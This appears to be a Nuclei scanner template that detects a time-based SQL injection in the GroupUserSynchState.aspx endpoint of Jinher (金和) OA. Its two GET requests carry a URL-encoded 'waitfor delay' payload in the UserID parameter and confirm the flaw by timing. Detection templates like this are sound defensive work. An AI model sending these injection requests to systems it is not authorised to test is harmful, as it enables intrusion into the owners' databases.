id: jinher-groupusersynchstate-sqli
info:
  name: "金和OA GroupUserSynchState.aspx SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  description: |
    A potential SQL Injection vulnerability in the 金和OA GroupUserSynchState.aspx endpoint.

http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.AddMenu/GroupUserSynchState.aspx/?UserID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a5%27%2d%2d&op=view HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/Jhsoft.Web.AddMenu/GroupUserSynchState.aspx/?UserID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a8%27%2d%2d&op=view HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "用户公开范围查看"
          - "外部系统名称"
          - "成功标识"
          - "JHSoft"
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
